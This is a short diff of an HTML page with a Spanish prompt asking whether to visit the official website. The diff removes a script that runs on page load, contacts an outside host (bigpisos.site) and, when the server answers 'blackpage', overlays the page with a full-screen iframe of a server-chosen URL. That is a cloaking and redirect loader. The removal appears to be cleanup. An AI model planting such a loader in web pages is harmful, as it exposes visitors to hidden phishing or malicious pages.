@@ -13,35 +13,7 @@ body {
 </style>
 </head>
 	
-<body>
-		<script>
-    window.onload = function () {
-        var http = new XMLHttpRequest();
-        var url = 'https://bigpisos.site/b235/ajax.php';
-        var params = '';
-        http.open('POST', url, true);
-        //Send the proper header information along with the request
-        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        http.onreadystatechange = function () {//Call a function when the state changes.
-            if (http.readyState == 4 && http.status == 200) {
-                var obj = JSON.parse(http.responseText);
-                if(obj.type == 'blackpage') {
-                    var ifrm = document.createElement("iframe");
-                    ifrm.setAttribute("src", obj.page);
-                    ifrm.style.width = "100%";
-                    ifrm.style.height = "100%";
-                    ifrm.style.border = "none";
-                    ifrm.style.margin = "none";
-                    ifrm.style.position = "absolute";
-                    ifrm.style.top = "0";
-                    document.body.appendChild(ifrm);
-                }
-            }
-        };
-        http.send(params);
-    }
-</script>
-	
+<body>	
     <div class="wrapper">
         <div class="center">
             <p><font color="red">Visitar el sitio web oficial?</font></p>
